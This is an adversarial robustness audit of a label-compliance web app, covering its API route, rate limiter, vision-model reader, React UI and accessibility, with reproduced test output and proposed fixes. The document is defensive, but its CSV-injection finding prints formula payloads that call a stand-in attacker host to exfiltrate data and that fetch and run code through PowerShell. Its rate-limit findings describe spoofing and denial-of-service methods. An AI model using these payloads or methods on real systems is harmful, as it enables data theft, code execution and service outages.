# Robustness audit — API route, readers, React, accessibility, deploy

Adversarial audit of everything **except** the rules engine (`src/lib/ttb/*` is a
separate auditor's scope; it appears here only where a defect elsewhere flows
into it).

**Method.** Read the source, then attacked a running dev server
(`next dev -p 3111`, no API key, so the `MockReader` path) with scripted HTTP
requests; drove the real `GeminiReader` against an intercepted `fetch`; ran the
rate limiter and the `BatchCheck.run()` state machine in isolation; computed
WCAG ratios from the token values rather than eyeballing them; inspected the
live DOM in Chrome; ran `npm run build`, `npx tsc --noEmit`, `npm run lint`,
`npx vitest run`, and grepped `.next` for secrets.

Nothing under `src/` or `tests/` was modified. Throwaway scripts live in
`scratch/` (gitignored).

**Labels.** Every finding is marked **REPRODUCED** (I ran it and pasted the
output) or **INFERRED** (traced through the code, not executed end to end).

**Environment caveat, stated up front.** The Chrome instance available to me
could not hydrate the client bundle — its request layer aborted
`_next/static/chunks/_1h5ujqm._.js` (the `SingleCheck` chunk) with
`403 / net::ERR_ABORTED` on every load, and a hydration probe confirmed
`REACT_IS_HYDRATED: false`. Static DOM, CSS, focus order and accessible names
were measurable and are reported as REPRODUCED. Anything requiring a live React
render loop (the sample picker actually appearing, the batch run in a browser)
is reported from a faithful out-of-browser simulation or from code, and labelled
accordingly. **No React finding below should be read as "I clicked it and saw
it" unless it says REPRODUCED.**

---

## Summary

| # | Severity | Finding | Label |
|---|---|---|---|
| 1 | CRITICAL | `parseApplication` bounds nothing; one request burns 5s of the event loop and returns 40 MB | REPRODUCED |
| 2 | CRITICAL | Rate limiter is defeated by a header the client sets, and its Map grows without bound | REPRODUCED |
| 3 | HIGH | `GeminiReader` does no runtime validation; six malformed shapes crash the server or the browser | REPRODUCED |
| 4 | HIGH | The 60/min limit destroys the advertised 200–300 label batch: 240 of 300 fail permanently | REPRODUCED |
| 5 | HIGH | CSV export writes unescaped formulas into a file agents open in Excel | REPRODUCED |
| 6 | MEDIUM | MIME type is trusted on declaration alone — arbitrary bytes billed to the operator's key | REPRODUCED |
| 7 | MEDIUM | Whole request body is buffered before the 8 MB cap is applied | REPRODUCED |
| 8 | MEDIUM | Every non-JSON error is shown to the agent as "check your connection" | REPRODUCED |
| 9 | MEDIUM | Batch "Stop" and progress controls vanish the instant a small run starts | REPRODUCED (simulation) |
| 10 | MEDIUM | Nameless, invisible file input is a keyboard tab stop | REPRODUCED |
| 11 | MEDIUM | Nested `<label>` gives the first radio a 90-character accessible name | REPRODUCED |
| 12 | MEDIUM | `--color-line` is 1.38:1 — below WCAG 1.4.11 on the drop zone and outline buttons | REPRODUCED |
| 13 | MEDIUM | `ElapsedTimer` is a live region that changes ten times a second | INFERRED |
| 14 | LOW | Raw V8 JSON parser errors are returned to the client | REPRODUCED |
| 15 | LOW | Gemini's catch-all blames the network for every failure | REPRODUCED |
| 16 | LOW | `loadSample` ignores `response.ok` and uploads an HTML error page as artwork | REPRODUCED |
| 17 | LOW | Files added mid-run are stranded in `queued` | REPRODUCED (simulation) |
| 18 | LOW | `npm run lint` fails while `npm run build` passes | REPRODUCED |
| 19 | LOW | `aria-live` region is mounted already populated, so it never announces | INFERRED |
| 20 | LOW | `next dev` leaves untracked `AGENTS.md` / `CLAUDE.md` in the repo | REPRODUCED |

Fourteen things I expected to be broken and were not are in
[Things I tried that turned out to be fine](#things-i-tried-that-turned-out-to-be-fine).
The colour palette in particular is genuinely good — all twenty text pairs pass
AA, computed not guessed.

---

## 1. CRITICAL — `parseApplication` bounds nothing; one request burns five seconds of the event loop

**REPRODUCED.**
`src/app/api/verify/route.ts:150-185` (`parseApplication`, `text`)

`text()` trims a string and returns it. There is no length check on any field.
`brandName` and `classType` flow straight into the normalisation ladder, into
`levenshtein` (O(n·m)), and into template literals that are serialised back to
the client.

```
$ node scratch/attack2.mjs
=========== C. parseApplication BOUNDS ===========
C1 brandName length 1e+3
   HTTP 200  30ms  respBytes=5840  reqBytes=1000 amplification=5.84x
C1 brandName length 1e+6
   HTTP 200  436ms  respBytes=2003844  reqBytes=1000000 amplification=2.00x
C1 brandName length 8e+6
   HTTP 200  1132ms  respBytes=16003844  reqBytes=8000000 amplification=2.00x

=========== C2. WORST-CASE Levenshtein ===========
C2 brandName 2e+7 non-matching chars
   HTTP 200  6336ms  respBytes=40003846  reqBytes=40000000 amplification=1.00x
```

Attributing that cost in-process, with no network in the way:

```
$ npx tsx scratch/cpu.ts
n       rules verify(ms) bare levenshtein(ms)  JSON.stringify(report)(ms)  report bytes
1e+6    419             84                    5                           2003777
1e+7    2732            855                   48                          20003779
2e+7    5034            1599                  93                          40003779

--- single-request CPU cost vs. the route's own 60 req/min/IP budget ---
one request at n=2e7 burns 5367ms of the single Node event loop
60 such requests (the per-IP-per-minute allowance) = 322.0s of CPU in a 60s window
=> 5.4x oversubscription of one instance from ONE unspoofed IP
```

Levenshtein is only a third of it; the rest is normalisation and building
explanation strings over a 20 MB value. Note this needs **no** valid API key, no
authentication, and stays inside the route's own rate limit.

**Consequence.** Node is single-threaded. One anonymous request holds the event
loop for five seconds, during which every compliance agent using the deployment
is frozen. A single client staying inside the advertised 60/min budget
oversubscribes an instance 5.4×. The 40 MB response also costs egress on the
operator's account. Combined with finding 2 (the limit is bypassable at will)
this is a one-line denial of service against a public federal prototype.

**Fix.** Bound every field in `text()` — a brand name is not 20 MB:

```ts
const MAX_FIELD = 300;                     // longest real class/type is ~120 chars
function text(value: unknown): string | undefined {
  if (typeof value !== "string") return undefined;
  if (value.length > MAX_FIELD) throw new Error(`That entry is too long (limit ${MAX_FIELD} characters).`);
  const trimmed = value.trim();
  return trimmed.length > 0 ? trimmed : undefined;
}
```

Also cap `applicationRaw.length` before `JSON.parse` (a few KB is ample), and
guard `levenshtein` with a length ceiling so the rules engine is safe regardless
of who calls it.

---

## 2. CRITICAL — the rate limiter is defeated by a header the client controls, and its Map grows without bound

**REPRODUCED.**
`src/lib/ratelimit.ts:22` (`windows`), `:25-29` (`sweep`), `:46` (threshold), `:74-78` (`clientKey`)

`clientKey` takes the first entry of `X-Forwarded-For` verbatim. Rotate it and
the per-IP budget evaporates:

```
$ node scratch/rlhttp.mjs
=== H1: 70 requests from ONE claimed IP ===
   status counts: {"400":60,"429":10,"_first":61,"_retryAfter":"60"}

=== H2: 300 requests, each claiming a DIFFERENT IP (spoofed X-Forwarded-For) ===
   status counts: {"400":300}
   -> 0 x 429 means the per-IP budget is defeated by a single header the client controls.

=== H3: oversized X-Forwarded-For becomes the Map key verbatim ===
   7000-char XFF accepted: HTTP 400  (key of that length is now retained for 60s)
```

Three separate defects compound:

**(a) The sweep threshold is checked before the insert and only deletes expired
entries.** Line 46 runs `if (windows.size > 1000) sweep(now)`; `sweep` deletes
entries whose `resetAt <= now`. Inside a single 60-second window *every* entry is
live, so the sweep deletes nothing and the Map keeps growing — while now running
a full scan on **every** request:

```
$ npx tsx scratch/rl.ts
=== R1: does a rotating X-Forwarded-For defeat the limit entirely? ===
200,000 requests, each with a distinct spoofed IP -> 0 blocked (0 = limiter fully bypassed)

=== R2: per-call cost as the map grows ===
  map size ~200k  -> 0.9032 ms per rateLimit() call
```

Total work is quadratic in request count: the thing meant to cap load becomes
the load. At 200k entries the limiter alone costs 0.9 ms of event loop per
request, before the route does anything.

**(b) The key is attacker-sized.** No length cap, no IP validation:

```
    header of 8000 'A' -> map key of length 8000 (no truncation, no IP validation)
    Node's default max header size is 16KB, so ~16KB per key is reachable.
    2000 requests with distinct 16KB keys = ~32MB of live Map, none of it sweepable inside the window.
```

**(c) `existing.count += 1` runs even when already blocked** (line 54), so a
blocked client's counter grows without limit and each blocked request still pays
the full sweep — flooding a blocked IP is no cheaper than flooding an allowed
one.

**Consequence.** The module docstring names the exact risk it exists to
mitigate: *"anyone who finds the URL can spend the operator's API budget, so some
limit is not optional."* With a rotating header there is no limit, so with a real
key configured an attacker can spend the operator's balance at whatever rate the
provider will serve, and simultaneously exhaust instance memory. The README
honestly calls this "a speed bump against casual abuse" — the finding is that it
is not even that, because bypassing it takes one header rather than a botnet.

**Fix.** Three changes, none large:

- Trust the proxy hop count rather than the whole header. On Vercel/Cloudflare
  take the platform's own client-IP header (`x-vercel-forwarded-for`,
  `cf-connecting-ip`) and fall back to the socket address; never the raw first
  `X-Forwarded-For` entry.
- Validate and truncate: reject anything that is not a plausible IP, and cap the
  key at 64 characters.
- Move the sweep off the request path (a `setInterval`, or sweep on a time
  trigger rather than a size trigger) and add a hard `MAX_ENTRIES` above which
  new keys are refused rather than inserted.

---

## 3. HIGH — `GeminiReader` does no runtime validation; six malformed shapes crash the server or the browser

**REPRODUCED.**
`src/lib/reader/gemini.ts:161` (`JSON.parse(text) as LabelExtraction`), `:212-228` (`normalise`)

Line 161 is a bare TypeScript cast — zero runtime checking. `normalise()` then
guards only the **top level**: `raw.governmentWarning ?? null` replaces a missing
object, but passes a *present but malformed* one straight through. Every consumer
downstream assumes the full nested shape.

I drove the real `GeminiReader` with an intercepted `fetch`, then fed its output
into the real `verify()` and into the exact expressions `ReportView` evaluates:

```
$ npx tsx scratch/gemini-fuzz.mts
CRASH G1 governmentWarning present but text:null (required STRING came back null)
      stage: verify (rules engine, SERVER SIDE)
      TypeError: Cannot read properties of null (reading 'normalize')
      at words (src/lib/ttb/warning.ts:56:6)
OK    G2 governmentWarning missing the three booleans
CRASH G3 imageQuality present but WITHOUT `issues`
      stage: UI render (ReportView, CLIENT SIDE)
      TypeError: Cannot read properties of undefined (reading 'length')
CRASH G4 imageQuality.issues is a string, not an array
      stage: UI render (ReportView, CLIENT SIDE)
      TypeError: report.imageQuality.issues.map is not a function
CRASH G5 notes is a string, not an array
      stage: UI render (ReportView, CLIENT SIDE)
      TypeError: report.notes.map is not a function
CRASH G6 brandName is a bare string instead of {text,confidence}
      stage: verify (rules engine, SERVER SIDE)
      TypeError: Cannot read properties of undefined (reading 'replace')
      at collapseWhitespace (src/lib/ttb/normalize.ts:42:16)
CRASH G7 brandName: {text:null}
      stage: verify (rules engine, SERVER SIDE)
      TypeError: Cannot read properties of null (reading 'replace')
      at collapseWhitespace (src/lib/ttb/normalize.ts:42:16)
CRASH G8 whole payload is `null`
      stage: read
      ReaderError: Cannot read properties of null (reading 'brandName')
OK    G9 whole payload is an array
OK    G10 confidence is a string
```

G1 is exactly the case the brief predicted: `governmentWarning.text: null`
reaches `warning.ts:143`, which calls `diffWords(STATUTORY_WARNING, reading.text)`
→ `words(text)` → `text.normalize("NFKC")` on `null`. `warning.ts:167`
(`reading.text.includes(...)`) would fail the same way.

*(Re-verified after the concurrent rules-engine audit had begun editing
`src/lib/ttb/{abv,normalize,rules,warning}.ts`: all seven crashes still reproduce
against the current working tree. The defect is in the reader, not the engine, so
fixing the engine's null-handling would only move the symptom.)*

**Two different blast radii.** G1/G6/G7 throw inside `verify()` on the server, so
route.ts's generic catch converts them to a 500 — handled, but the label cannot
be reviewed and the operator sees only "Unexpected verification failure" in the
logs. G3/G4/G5 pass server-side validation, are serialised into a 200 response,
and crash **in the browser** at `ReportView.tsx:126`, `:147` and `:81` — an
unhandled React render error, i.e. a blank screen with no explanation, which for
a 73-year-old user is the worst possible failure mode.

**The asymmetry is the real finding.** The sibling reader already does this
properly:

```
$ grep -n "zodOutputFormat|labelExtractionSchema" src/lib/reader/*.ts
anthropic.ts:11:import { zodOutputFormat } from "@anthropic-ai/sdk/helpers/zod";
anthropic.ts:13:import { EXTRACTION_PROMPT, labelExtractionSchema } from "./schema";
anthropic.ts:67:          format: zodOutputFormat(labelExtractionSchema),
gemini.ts:  (no match — only `JSON.parse(text) as LabelExtraction`)
```

`labelExtractionSchema` is exported from the shared `schema.ts`, zod 4.4.3 is
already a dependency, and Gemini is the **default** reader (`index.ts:27` puts it
first in resolution order). So the seam's stated promise — "swapping the vision
model changes only *how well* the label is read" — does not hold: it also changes
whether the extraction is validated at all.

How likely is a malformed response? The file's own comment concedes it:
*"`required` in Gemini's schema is a strong hint rather than a hard guarantee."*
`GEMINI_MODEL` is an operator-settable env var interpolated into the URL, so
pointing it at a model with weaker structured-output support is a supported
configuration that produces exactly these shapes.

**Fix.** One line, using what is already imported elsewhere:

```ts
import { labelExtractionSchema } from "./schema";
// ...
const parsed = labelExtractionSchema.parse(JSON.parse(text));
```

Put it inside the existing `try` so a `ZodError` becomes the "unreadable
response" `ReaderError` that is already written. That closes G1 and G3–G7 at
once. Separately, `ReportView` should treat `issues`/`notes` defensively
(`(quality.issues ?? [])`), because no UI should be one bad array away from a
white screen.

---

## 4. HIGH — the 60/min limit destroys the advertised 200–300 label batch

**REPRODUCED.**
`src/app/api/verify/route.ts:47` (`RATE_LIMIT`) vs `src/components/BatchCheck.tsx:38, 152, 156-169`

The README's headline batch claim is *"big importers who dump 200, 300 label
applications on us at once"*. The route allows 60 requests per minute per IP.

```
$ node scratch/rlhttp.mjs
=== H4: what a 300-label BATCH from one honest office IP actually gets ===
   300 sequential /api/verify calls from one IP: 60 processed, 240 rejected with 429
```

`BatchCheck` has no retry and no 429 handling. Line 156-169 marks any non-OK
response `status: "failed"` with `error: payload?.message`, permanently. So the
run finishes with 60 results and 240 rows reading *"Too many labels submitted at
once. Try again in 60 seconds."* — and the only recovery is to re-add the files
and start again, which fails the same way.

It is worse in situ than in this test: a TTB office shares one NAT'd public IP,
so the 60/min budget is consumed by the **whole team**, not per user.

**Consequence.** The flagship feature does not work at its advertised scale, and
fails in the way most likely to be mistaken for a compliance result — 240 rows of
red text in a results table an agent is meant to trust.

**Fix.** Have `BatchCheck` honour `Retry-After` on a 429 (the route already sends
it) and re-queue rather than fail the item; a token-bucket delay at concurrency 4
is enough to pace 300 labels under any sane limit. Separately, raise
`RATE_LIMIT.limit` or key it per-session rather than per-IP, so one office does
not throttle itself.

---

## 5. HIGH — CSV export writes unescaped formulas into a file agents open in Excel

**REPRODUCED.**
`src/lib/csv.ts:93-100` (`escapeCell`), used by `src/components/BatchCheck.tsx:212-257`

`escapeCell` quotes only when a cell contains `"`, `,`, `\n` or `\r`. It never
neutralises the leading `=`, `+`, `-`, `@`, tab or CR that Excel and LibreOffice
treat as the start of a formula (CWE-1236). The exported columns include
`item.file.name` and `item.application.brandName` — both supplied by the importer
being reviewed, via the filenames they send and the manifest CSV they hand in.

```
$ npx tsx scratch/csvinj.mts
--- label-check-results.csv as written by exportCsv() ---
File,Application ID,Brand name,Recommendation,Summary,...
=cmd|'/c calc.exe'!A0.png,,"=HYPERLINK(""http://attacker.example/?d=""&A1,""Open TTB report"")",reject,...
+ok.png,,@SUM(1+9)*cmd|'/c powershell IEX(wget 0.0.0.0/p)'!A0,reject,...
--- end ---

Cells beginning with = + - @ (Excel/LibreOffice treat these as formulas): 4
    =cmd|'/c calc.exe'!A0.png
    "=HYPERLINK(""http://attacker.example/?d=""&A1
    +ok.png
    @SUM(1+9)*cmd|'/c powershell IEX(wget 0.0.0.0/p)'!A0
```

Note the payload survives the round trip: `parseCsvRecords` reads `brandname`
from the hostile manifest, it becomes `application.brandName`, and `toCsv` writes
it back out unguarded — and also embeds it inside the `Summary` explanation.

**Consequence.** A federal reviewer exports results and opens them in Excel on a
government workstation. `=HYPERLINK` exfiltrates row data on click; the DDE form
attempts command execution. The attacker is the regulated party, the delivery
vehicle is the tool's own output, and the file arrives looking like an internal
report.

**Fix.** In `escapeCell`, prefix any cell whose first character is in
`= + - @ \t \r` with a single quote (or a leading `'` inside the quoted form),
and always quote such cells:

```ts
function escapeCell(value: string | number | null | undefined): string {
  if (value === null || value === undefined) return "";
  let text = String(value);
  if (/^[=+\-@\t\r]/.test(text)) text = "'" + text;
  if (/[",\n\r]/.test(text)) return `"${text.replace(/"/g, '""')}"`;
  return text;
}
```

---

## 6. MEDIUM — MIME type is trusted on declaration alone

**REPRODUCED.**
`src/app/api/verify/route.ts:80-84`

`ALLOWED_TYPES.has(file.type)` checks only what the client *said*. No magic-byte
sniffing:

```
$ node scratch/attack1.mjs
--- B3 MIME LIES: declares image/png, content is a PHP/JS payload
    HTTP 200  14ms  len=3854
--- B4 MIME LIES: declares image/png, content is a 200KB ZIP
    HTTP 200  16ms  len=3854
--- B5 disallowed type image/svg+xml (SVG = script vector)
    HTTP 400  {"error":"bad_request","message":"image/svg+xml cannot be read. ..."}
```

B5 is correct — SVG is properly excluded. But B3/B4 show any bytes at all can be
labelled `image/png` and accepted.

**Consequence.** Nothing is stored or re-served, so this is not stored XSS or
RCE. The cost is money and latency: with a real key, up to 8 MB of arbitrary
data per request is base64-encoded and shipped to the operator's paid vision
endpoint, which bills for the input tokens before returning an error. Chained
with finding 2 (no effective rate limit) that is an unbounded spend vector
against the operator's account — the precise risk `ratelimit.ts` was written to
prevent.

**Fix.** Sniff the first bytes before dispatching to a reader — PNG `89 50 4E 47`,
JPEG `FF D8 FF`, GIF `47 49 46 38`, WebP `RIFF....WEBP` — and reject a mismatch
with the message already written for an unsupported type. Roughly ten lines, no
dependency.

---

## 7. MEDIUM — the whole body is buffered before the 8 MB cap is applied

**REPRODUCED.**
`src/app/api/verify/route.ts:63` (`await request.formData()`) vs `:75` (size check)

The size check is twelve lines after the body has already been read into memory:

```
$ node scratch/final.mjs
=== E1: is the whole body buffered BEFORE the 8MB cap is applied? ===
  12MB image -> HTTP 400 after 90ms (server read all 12MB first)
     {"error":"bad_request","message":"That image is 12.0 MB. The limit is 8 MB — please use a smaller photograph."}
  40MB image -> HTTP 400 after 359ms (server read all 40MB first)
     {"error":"bad_request","message":"That image is 40.0 MB. The limit is 8 MB — please use a smaller photograph."}
```

The message is excellent and the rejection is correct — but `MAX_IMAGE_BYTES` is
a *policy* control, not a memory control. It cannot be, because it reads
`file.size`, which only exists once the multipart body has been parsed. Finding 1
showed the same door open for the non-file `application` field, where there is no
cap at all.

**Consequence.** Peak memory per request is set by the attacker, not by the
constant. On a small serverless instance a handful of concurrent large uploads
is an OOM, and the "rejecting early costs nothing" comment on line 27-30 is not
true as written.

**Fix.** Reject on `Content-Length` before touching the body:

```ts
const declared = Number(request.headers.get("content-length") ?? 0);
if (declared > MAX_IMAGE_BYTES + 64 * 1024) return badRequest(/* ...same message... */);
```

and keep the existing post-parse check as the authoritative one for
chunked/absent `Content-Length`.

---

## 8. MEDIUM — every non-JSON error is shown to the agent as "check your connection"

**REPRODUCED.**
`src/components/SingleCheck.tsx:101` and `:117-124`; same shape at `BatchCheck.tsx:153`

`await response.json()` runs **before** `response.ok` is consulted. Any error
response that is not JSON — a platform 413, a proxy 502, a gateway timeout page,
a captive portal — throws inside the `try`, and the outer `catch` reports it as a
network problem:

```
$ node scratch/nonjson.mjs
Server actually returned : HTTP 413  text/plain  'Request Entity Too Large'
User is actually shown   : "Could not reach the server. Check your connection and try again."
```

This matters most for the size path. The client downscales before upload, but
`downscale.ts:65` passes GIFs through untouched and `:66` skips anything under
400 KB, so a large GIF reaches the server at full size. If the hosting platform's
own request-body limit is below `MAX_IMAGE_BYTES` (8 MB) — **INFERRED**, I could
not test the deployment target, but several serverless platforms cap serverless
request bodies well under 8 MB — the carefully written "That image is 12.0 MB.
The limit is 8 MB" message is never reachable in production, and the agent
instead gets told to check a connection that is working fine, beside a "Try
again" button that cannot help.

**Fix.** Check `response.ok` first and parse defensively:

```ts
if (!response.ok) {
  const payload = await response.json().catch(() => null);
  setStatus({ phase: "error",
    message: payload?.message ?? `The server rejected this request (HTTP ${response.status}).`,
    retryable: payload?.retryable ?? response.status >= 500 });
  return;
}
```

Also confirm the platform's body limit and set `MAX_IMAGE_BYTES` below it.

---

## 9. MEDIUM — the batch "Stop" and progress controls vanish the instant a small run starts

**REPRODUCED (simulation).**
`src/components/BatchCheck.tsx:209` (`readyCount`), `:331` (section gate), `:341-351` (Stop button)

`readyCount` counts items still `queued`. The section gated on `readyCount > 0`
contains **both** the run button (with its "Checking…" progress label) **and** the
Stop button. `run()` flips each item to `working` as it is dequeued, so
`readyCount` falls to zero while work is still in flight and the whole section
unmounts.

I re-implemented `run()` and the two render gates verbatim and logged every
distinct render:

```
$ node scratch/batchsim.mjs
=== SIM 1: a 4-label batch (<= CONCURRENCY) ===
  t4: runSection=true  stopButton=true  readyCount=1 statuses=wwwq
  t5: runSection=false stopButton=false readyCount=0 statuses=wwww
  ...
  t9: runSection=false stopButton=false readyCount=0 statuses=dddd

=== SIM 3: does the Stop button reach the user before it vanishes? (4 labels) ===
  immediately after click: runSection=false stopButton=false statuses=wwww

=== SIM 2: a 12-label batch ===
  t20: runSection=true  stopButton=true  readyCount=1 statuses=ddddddddwwwq
  t21: runSection=false stopButton=false readyCount=0 statuses=ddddddddwwww
```

Two distinct symptoms. For any batch of four or fewer, SIM 3 shows the control
section is already gone on the first paint after the click: the agent presses
"Check 4 labels", the button disappears, and until the first report lands nothing
on screen indicates work is happening. For larger runs the Stop button and the
progress indicator disappear for the final `CONCURRENCY` labels (t21 above), so
the tail of a 300-label run cannot be stopped.

**Consequence.** The primary control disappears at the moment of use, which for
the stated audience reads as "the app broke". The Stop affordance is unreachable
exactly when a long run most needs it.

**Fix.** Gate the section on the run's own state, not on the leftover queue:

```tsx
{(readyCount > 0 || running) && ( … )}
```

and label the button from a stable count (`pending.length` captured at run start)
rather than the shrinking `readyCount`.

---

## 10. MEDIUM — a nameless, invisible file input is a keyboard tab stop

**REPRODUCED** in Chrome against the live DOM.
`src/components/SingleCheck.tsx:312-322`; same pattern at `BatchCheck.tsx:273-282` and `:307-316`

The `sr-only` file input stays in the tab order and in the accessibility tree,
but is 1×1 px and has no label:

```js
// scratch: live DOM probe
"invisibleFocusStops": [
  { "i": 0,  "tag": "a",           "name": "Skip to main content", "box": "1x1" },
  { "i": 16, "tag": "input[file]", "name": "",                     "box": "1x1" }
],
"fileInput": { "class": "sr-only", "ariaLabel": null, "labelCount": 0,
               "box": "1x1", "isActiveElement": true }
```

(The skip link is fine — see the "turned out to be fine" section.) Tab stop 15 is
the visible "Choose a file" button; tab stop 16 is this input. A keyboard user
tabs past the visible button into a control they cannot see — the focus ring is
drawn on a 1×1 clipped box — and a screen-reader user hears an unnamed file
control. That is WCAG 2.4.7 (Focus Visible) and 4.1.2 (Name, Role, Value).

`BatchCheck` has the same problem in a subtler form: the visible affordance is a
styled `<label>`, but focus lands on the `sr-only` `<input>` inside it and there
is no `:focus-within` style on the label, so "Choose manifest CSV" and "Choose
label images" also have no visible keyboard focus.

**Fix.** In `SingleCheck` the input is opened programmatically by the button, so
it should not be a tab stop at all: add `tabIndex={-1}` and `aria-hidden="true"`.
In `BatchCheck`, keep the input focusable (the label is the affordance) and add
`focus-within:outline-3 focus-within:outline-[var(--color-brand)]` to the label
so the ring appears on the thing the user can actually see.

---

## 11. MEDIUM — nested `<label>` gives the first radio a 90-character accessible name

**REPRODUCED** in Chrome, using the browser's own `input.labels` association.
`src/components/ApplicationForm.tsx:167-184` (`Field`) wrapping `:44-60` (radio labels)

`Field` renders a `<label>` around its children; the beverage-type children are
themselves three `<label>` elements. Nesting `<label>` inside `<label>` is invalid
HTML, and the outer label implicitly associates with the first labelable
descendant:

```js
"nestedLabels": 3,
"radios": [
  { "labelCount": 2,
    "labels": ["Beverage type* (required)Determines which rules and tolerances apply.D",
               "Distilled spirits"] },
  { "labelCount": 1, "labels": ["Wine"] },
  { "labelCount": 1, "labels": ["Malt beverage (beer)"] }
]
```

The first radio has **two** associated labels. Per the accessible-name algorithm
they concatenate, so "Distilled spirits" is announced with the group heading, the
required marker, the hint sentence and the text of all three options prepended —
while "Wine" and "Malt beverage (beer)" are announced normally. The inconsistency
is the part that will actually confuse someone: one option in a group sounds
completely different from its siblings.

There is also no `radiogroup` semantics, so the group name "Beverage type" is not
announced when arrowing between options.

**Fix.** Give `Field` a non-label variant for grouped controls:

```tsx
<fieldset>
  <legend><span>Beverage type</span><span className="sr-only"> (required)</span></legend>
  <p id="bev-hint">Determines which rules and tolerances apply.</p>
  {/* three <label><input type="radio" aria-describedby="bev-hint" …/></label> */}
</fieldset>
```

The text-input uses of `Field` are fine as they are.

---

## 12. MEDIUM — `--color-line` is 1.38:1, below the 3:1 floor for the controls that use it

**REPRODUCED** by computing the ratios from the token values in
`src/app/globals.css:26`, not by eye. Full run in `scratch/contrast.mjs`.

**All twenty text pairs pass AA** — see the fine section; this is the only
contrast failure.

```
### NON-TEXT / UI COMPONENT (WCAG 1.4.11, 3:1)
FAIL  1.38:1  (need 3:1)  LINE border on surface  [#d7dce3 on #ffffff]  -- every card border, drop-zone border
FAIL  1.27:1  (need 3:1)  LINE border on canvas   [#d7dce3 on #f4f6f9]  -- card borders on page bg
PASS  4.53:1  pass border on pass-bg
PASS  5.38:1  review border on review-bg
PASS  5.72:1  fail border on fail-bg
PASS  8.57:1  brand focus ring on surface
```

Confirmed on the live element:

```js
"dropZone": { "role": null, "ariaLabel": null, "tabIndex": -1,
              "borderColor": "rgb(215, 220, 227)" }   // = #d7dce3
```

On decorative card borders 1.38:1 is defensible. It is not defensible on:

- the **drop zone** (`SingleCheck.tsx:293`, `border-4 border-dashed`) — the sole
  visual indication of where to drop a label, and the primary affordance of the
  screen;
- the **outline buttons** that use `border-2 border-[var(--color-line)]` —
  "Choose a different image" (`SingleCheck.tsx:271`) and "Details"
  (`BatchCheck.tsx:423`), where the border *is* the button boundary;
- the **text inputs** (`ApplicationForm.tsx:201`, `border-2`), where the border is
  the only thing distinguishing a field from the card behind it.

For an audience explicitly benchmarked at 73 — an age at which lens yellowing and
reduced contrast sensitivity are typical — a 1.38:1 field boundary is close to
invisible.

**Fix.** Split the token. Keep `--color-line: #d7dce3` for decorative rules, and
add a `--color-line-strong` for input borders, the drop zone and outline buttons.
Candidate values, computed against both backgrounds — the token must clear 3:1 on
`--color-canvas` too, not just on white:

```
#8a94a3  on #ffffff = 3.07:1 | on #f4f6f9 = 2.83:1  => fails on canvas
#7f8896  on #ffffff = 3.58:1 | on #f4f6f9 = 3.31:1  => PASSES both
#767e8c  on #ffffff = 4.09:1 | on #f4f6f9 = 3.78:1  => PASSES both, more headroom
```

`#767e8c` is the safer pick. Also give the drop zone `role="button"` with an
`aria-label`, since it is currently announced as nothing at all.

---

## 13. MEDIUM — `ElapsedTimer` is a live region that changes ten times a second

**INFERRED** from code (I could not hydrate React to hear it).
`src/components/SingleCheck.tsx:221-236`

```tsx
const id = setInterval(() => setElapsed(Date.now() - startedAt), 100);   // :225
…
<p className="…" role="status">Reading the label — {seconds}s …</p>       // :231
```

`role="status"` is an implicit `aria-live="polite" aria-atomic="true"` region. Its
text changes every 100 ms, so a screen reader is handed ten new announcements per
second for the whole request. Polite announcements queue: NVDA and JAWS will
either read a continuous stream of "Reading the label 0.1 seconds, Reading the
label 0.2 seconds…" or fall behind and keep talking after the result has already
arrived — at which point it collides with the focus move to the results
(`:128-133`).

The intent is right and well argued in the comment. The implementation makes the
screen unusable with a screen reader for the duration of every check.

**Fix.** Keep the visible ticker, but move the live region off it:

```tsx
<p className="…">Reading the label — {seconds}s{elapsed > 8000 && " · taking longer than usual"}</p>
<p role="status" className="sr-only">
  {elapsed > 8000 ? "Still reading the label. This is taking longer than usual." : "Reading the label."}
</p>
```

so exactly two announcements are made per request. Add `aria-busy="true"` on the
results container while working.

---

## 14. LOW — raw V8 JSON parser errors are returned to the client

**REPRODUCED.** `src/app/api/verify/route.ts:94-98`

```
$ node scratch/attack2b.mjs
D7 not JSON at all
   HTTP 400  {"error":"bad_request","message":"Unexpected token '!', \"!!!not json!!!\" is not valid JSON"}
```

`error instanceof Error ? error.message : …` passes `JSON.parse`'s own message
through. Every other error in the file is hand-written for a compliance agent;
this one is a V8 parser diagnostic, and it echoes the caller's input back.

No stack trace, path or key leaks (see the fine section — I checked every catch),
so this is presentation and minor runtime fingerprinting, not disclosure.

**Fix.** Separate the two failures:

```ts
let raw: unknown;
try { raw = JSON.parse(applicationRaw); }
catch { return badRequest("The application data was not valid."); }
try { application = parseApplication(raw); }
catch (error) { return badRequest(error instanceof Error ? error.message : "The application data was not valid."); }
```

---

## 15. LOW — Gemini's catch-all blames the network for every failure

**REPRODUCED** (case G8 in the fuzz run). `src/lib/reader/gemini.ts:189-197`

Any error that is not a `ReaderError` and not an `AbortError` is turned into
*"Could not reach the label reader. This is usually a network or firewall
problem."* G8 showed a `null` payload — the provider **was** reached and answered
— reported under that message.

Given Marcus Williams' firewall history is quoted in the README, this is the
message most likely to send an operator to their network team for a problem that
is not there.

**Fix.** Reserve that message for `TypeError: fetch failed` / `ECONNREFUSED` /
`ENOTFOUND`, and give anything else the neutral "The label reader returned an
unreadable response. Please try again." that already exists on line 164.

---

## 16. LOW — `loadSample` ignores `response.ok` and uploads an HTML error page as artwork

**REPRODUCED.** `src/components/SingleCheck.tsx:76-78`

```
$ node scratch/final.mjs
=== E2: SingleCheck.loadSample has no response.ok check ===
  GET a missing sample -> HTTP 404, blob.type = "text/html;charset=utf-8", size = 15725
  => a File of type "text/html;charset=utf-8" containing an HTML error page is set as the label artwork.
  Submitting it: HTTP 400 -> {"error":"bad_request","message":"text/html;charset=utf-8 cannot be read.
                              Please upload a JPEG, PNG, GIF or WebP image."}
```

`blob.type || "image/png"` — the fallback never fires, because a 404 body has a
very real `text/html` type. The user clicks one of *our* sample buttons and is
told *their* file type is wrong.

The `catch` on line 79 only handles a thrown fetch, not an HTTP error status,
so the well-written "That sample label could not be loaded. Please try another."
message is unreachable for the most likely failure (a missing or misnamed file
in `public/samples/`).

**Fix.** `if (!response.ok) throw new Error("sample fetch failed");` before
`.blob()`, so the existing error path fires.

---

## 17. LOW — files added mid-run are stranded in `queued`

**REPRODUCED (simulation).** `src/components/BatchCheck.tsx:132`

`pending` is snapshotted from `items` when `run()` is invoked. Files chosen while
a run is in progress are never picked up:

```
$ node scratch/batchsim.mjs
=== SIM 4: files added mid-run (stale `pending` snapshot) ===
